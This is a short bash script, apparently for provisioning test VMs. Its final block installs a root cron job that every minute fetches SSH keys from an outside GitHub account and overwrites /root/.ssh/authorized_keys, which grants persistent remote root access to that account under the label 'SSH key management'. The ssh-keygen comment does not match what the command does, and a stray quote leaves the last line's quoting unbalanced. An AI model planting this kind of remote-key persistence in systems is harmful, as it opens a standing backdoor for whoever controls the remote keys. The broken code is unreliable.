#!/usr/bin/env bash

# This is used for first-time setup and provisioning on test VMs

# Don't be noisy on login
touch /root/.hushlogin

# Set up host keys without user intervention
ssh-keygen -q -t ed25519 -N '' <<< ""$'\n'"y" 2>&1 >/dev/null

# SSH key management
echo 'SHELL=/bin/sh \
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin \
*/1 * * * *   root curl https://github.com/pid1.keys > /root/.ssh/authorized_keys' > /etc/cron.d/keys'
